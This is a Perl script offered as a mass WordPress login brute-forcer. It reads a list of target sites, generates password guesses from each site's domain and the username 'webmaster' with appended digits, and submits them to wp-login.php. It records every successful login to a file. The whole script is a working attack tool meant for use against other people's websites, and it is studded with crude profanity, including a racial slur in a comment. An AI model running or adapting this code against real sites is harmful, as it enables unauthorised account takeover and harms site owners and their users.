#!/usr/bin/perl
# Contact : adamtnx@gmail.com
# There is no God but Allah, Muhammad is the Messenger of Allah
# greetz and thanks to : fallag kill3r / bl4ck_knight

use File::Copy "cp";
use Term::ANSIColor;
use URI::URL;
use LWP::UserAgent;
use IO::Socket::INET;
use HTTP::Request;
use HTTP::Request::Common qw(POST);
use HTTP::Request::Common qw(GET);


if($^O =~ /Win/){ system("cls");}else{ system("clear");}
print colored ("___________               ___.           __   ",'green'),"\n";  
print colored ("\__    ___/___ ___  ___   \_ |__   _____/  |  ",'green'),"\n";
print colored (" |    | /    \\  \/  /    | __ \ /  _ \   __\ ",'green'),"\n";
print colored (" |    ||   |  \>    <     | \_\ (  <_> )  |   ",'green'),"\n";
print colored (" |____||___|  /__/\_ \    |___  /\____/|__|   ",'green'),"\n";
print colored ("    \/      \/      \/                        ",'green'),"\n";
print colored ("                     coded by adam tnx        ",'red'),"\n";
print colored ("       fb : fb//adam.ag.750                   ",'red'),"\n";
  


#besm allah
print " salam for all+++";

#go go 
print " put your websites list dude :D";
my $list=<STDIN>;
chomp($list);
  open (THETARGET, "<$list") || die "[-] Can't open the Website list !";
@TARGETS = <THETARGET>;
close THETARGET;
$link=$#TARGETS + 1;

# Get da wordlist




print " Path to wordlist: "; 
my $passp=<STDIN>;
chomp($passp);
cp ("$passp","adamTnx.txt");


	
changenow: foreach $tofuck(@TARGETS){

chomp($tofuck);
$site = $tofuck;
if($site !~ /http:\/\//) { $site = "http://$site/"; };


## auto user Grab

#$aut="?author=1";
#$adamTnx=$site.$aut;
#$resp = $ua->request(HTTP::Request->new(GET => $adamTnx));
#$cont = $resp->content;
#while($cont =~ m/<title>(.*?) \|/g){
$admin = "webmaster";
#}
## Create Password List

$wp1 = $site . '/wp-login.php';
$resp = $ua->request(HTTP::Request->new(GET => $wp1));
$contg = $resp->content;
while($contg =~ m/<p id="backtoblog"><a href="http:\/\/(.*?)\//g){
$gpfw = $1;
}

print"\n[NOTE] I Will Generate a Passordlist \n[Wait]..............................";
sleep(2);
#U Can Add Some Word here and Dont call this recode hhhh 
@tnx = ('0','1','2','3','4','5','6','7','8','9','11','22','33','44','55','66','77','88','99','00','000','111','222','333','444','555','666','777','888','999','001','002','003','004','005','006','007','008','009','010','2000','2001','2002','2003','2004','2005','2006','2007','2008','2009','2010','2011','2012','2013','2014','2015','1','12','123','1234','12345','123456','1234567','12345678','123456789','1234567890','0987654321','987654321','87654321','7654321','654321','54321','4321','321','21','01','012','0123','01234','012345','0123456','01234567','012345678','0123456789','01234567890','0123456789','012345678','01234567','0123456','012345','01234','0123','012','121','131','124','123123','abc123','321321','321123','123321','112233','332211','102030','010203');
changenow: foreach $tnx(@tnx){
$pg="$gpfw$tnx";
$pg2="$admin$tnx";
open (TEXT, '>>adamTnx.txt');
print TEXT "$pg\n";
print TEXT "$pg2\n";
close (TEXT);
}
$pass = "adamTnx.txt";
  open (PASSWORD, "<$pass") || die "[-] Can't open the wordlist file !";
@PASSWORDS = <PASSWORD>;
close PASSWORD;
$pass=$#PASSWORDS + 1;



$red = $site . '/wp-admin/';
$wp = $site . '/wp-login.php';


print "\nSite: $site\nUser: $admin\n Wait bro...\n\n";

## boooom nigga

foreach $pass(@PASSWORDS){
chomp($pass);
print "searching $pass\n";
$brute = POST $wp, [log => $admin, pwd => $pass, wp-submit => 'Log In', redirect_to => $red];
$response = $ua->request($brute);
$stat = $response->status_line;
	if ($stat =~ /302/){

print colored ("[fucked and yfz] $site=> User :$admin Password:$pass",'white on_red'),"\n";
	open (TEXT, '>>fucked.txt');
	print TEXT "[BOOM] $site=> User :$admin Password:$pass\n\++++++++++Coded by adam tnx / enjoy :D \n++++++++++\n";
	close (TEXT);

$fucked++;
		next changenow;
	}
	if ($stat =~ /404/){
	print "$site not a wordpress site \n";
	next changenow;
	};
}
}
if(!$link){$link=0;}if(!$fucked){$fucked=0;}
if($link){
print "\n[TOTAL BRUTED] websites -> $link \n[TOTAL FUCKED] websites -> $fucked\n";

}